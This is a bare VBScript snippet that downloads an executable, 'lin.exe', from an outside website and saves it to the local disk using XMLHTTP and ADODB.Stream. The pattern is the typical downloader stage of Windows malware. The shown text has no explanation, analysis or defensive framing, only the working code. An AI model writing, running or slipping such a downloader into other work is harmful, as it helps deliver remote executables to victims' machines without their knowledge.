Set xPost = CreateObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://www.66baby.com/shop/lin.exe",0  
xPost.Send()  
Set sGet = CreateObject("ADODB.Stream")  
sGet.Mode = 3  
sGet.Type = 1  
sGet.Open()  
sGet.Write(xPost.responseBody)  
sGet.SaveToFile "lin.exe",2 